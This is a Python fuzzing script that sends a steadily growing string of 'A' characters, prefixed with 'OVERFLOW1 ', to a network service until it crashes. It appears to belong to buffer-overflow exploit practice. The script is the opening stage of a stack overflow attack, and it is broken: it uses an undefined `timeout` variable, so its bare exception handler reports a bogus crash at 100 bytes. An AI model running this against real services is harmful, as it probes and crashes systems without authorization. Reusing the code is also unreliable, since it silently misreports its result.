```python
#!/usr/bin/env python3

import socket, time, sys

if len(sys.argv) < 3:
  print('[e] Pass the ip and port as cli params!')
  print(f'[i] Usage: {sys.argv[0]} ip port')
  exit()

ip = sys.argv[1]
port = int(sys.argv[2])
prefix = "OVERFLOW1 "

string = prefix + "A" * 100

while True:
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024)
      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
      s.send(bytes(string, "latin-1"))
      s.recv(1024)
  except:
    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
    sys.exit(0)
  string += 100 * "A"
  time.sleep(1)
```
